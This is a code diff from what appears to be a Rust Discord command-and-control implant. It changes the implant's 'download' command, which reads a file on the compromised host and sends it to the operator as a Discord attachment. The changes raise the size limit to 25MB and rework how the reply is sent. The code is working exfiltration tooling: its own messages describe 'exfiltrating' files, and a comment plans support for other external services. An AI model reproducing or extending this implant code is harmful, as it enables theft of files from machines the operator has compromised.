@@ -1,6 +1,8 @@
 use crate::{
-    discord_utils::bot_functions::send_interaction_response, errors::DiscordC2Error,
-    os::process_handler::ProcessHandler, session::SHELL_TYPE,
+    discord_utils::bot_functions::{send_follow_up_response, send_interaction_response},
+    errors::DiscordC2Error,
+    os::process_handler::ProcessHandler,
+    session::SHELL_TYPE,
 };
 
 use std::{
@@ -14,10 +16,8 @@ use serenity::{
     model::{
         application::{
             command::CommandOptionType,
-            interaction::{
-                application_command::{
-                    ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
-                },
+            interaction::application_command::{
+                ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue,
             },
         },
         channel::AttachmentType,
@@ -25,7 +25,6 @@ use serenity::{
 };
 
 use tokio::fs::File;
-
 use tracing::{error, info as informational};
 
 pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
@@ -43,7 +42,9 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
         })
 }
 
-pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
+pub async fn run(
+    options: &[CommandDataOption],
+) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
     let options = options.to_owned();
     let option = options
         .get(0)
@@ -89,9 +90,7 @@ async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
     }
 }
 
-// TODO: Prevent downloading files greater than 100MB
 async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static>, DiscordC2Error> {
-
     // The read function will read the entire file into a Vec<u8>
     let final_bytes = tokio::fs::read(&file_path).await?;
 
@@ -99,38 +98,65 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
     let file = File::open(&file_path).await?;
     let metadata = file.metadata().await?;
 
-    // We will eventually support exfil to external services here
-    if metadata.len() >= 8 * (1024 * 1024) {
+    // We will eventually support exfil to external services here. Capping downloads to 25mb for now.
+    if metadata.len() >= 25 * (1024 * 1024) {
         return Err(DiscordC2Error::InternalError(
-            format!("File size is too large: ({} MB)", metadata.len() / (1024 * 1024)
+            format!("File size is too large: ({} bytes)", metadata.len()
         )));
-    }
+    } 
 
-    let file_name = file_path.file_name().ok_or(DiscordC2Error::InvalidInput(
-        "File name not found.".to_string(),
-    ))?.to_str().ok_or(DiscordC2Error::InternalError("Couldn't convert the file name to a string".to_string()))?;
+    let file_name = file_path
+        .file_name()
+        .ok_or(DiscordC2Error::InvalidInput(
+            "File name not found.".to_string(),
+        ))?
+        .to_str()
+        .ok_or(DiscordC2Error::InternalError(
+            "Couldn't convert the file name to a string".to_string(),
+        ))?;
 
     Ok(AttachmentType::Bytes {
         data: Cow::from(final_bytes),
         filename: file_name.to_string(),
     })
-    
 }
 
 pub async fn download_handler(
     ctx: &Context,
     command: &ApplicationCommandInteraction,
 ) -> Result<(), DiscordC2Error> {
+    let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
     let attachment = run(&command.data.options).await;
+    
+    let ctx1 = ctx.clone();
 
     match attachment {
         Ok(Some(attachment)) => {
             informational!("Successfully exfiltrated the requested file.");
-            send_interaction_response(ctx, &command.clone(), "Successfully exfiltrated the file!",Some(attachment)).await?;
+            tokio::spawn(async move {
+                if let Err(why) = send_follow_up_response(&ctx1, &response, "Successfully exfiltrated the file!", Some(attachment),).await {
+                    error!("Error sending follow up response: {}.", why);
+                }
+                
+                if let Err(why) = response
+                    .delete_original_interaction_response(&ctx1.http)
+                    .await {
+                        error!("Error deleting original interaction response: {}.", why);
+                }
+            });
         }
         Err(reason) => {
             error!("Failed to exfiltrate the file: {}", reason);
-            send_interaction_response(ctx,&command.clone(),format!("Failed to exfiltrate the file: `{}`", reason),None).await?;
+            send_follow_up_response(
+                ctx,
+                &response,
+                format!("Failed to exfiltrate the file: `{}`", reason),
+                None,
+            )
+            .await?;
+            response
+                .delete_original_interaction_response(&ctx.http)
+                .await?;
         }
         _ => return Ok(()),
     }
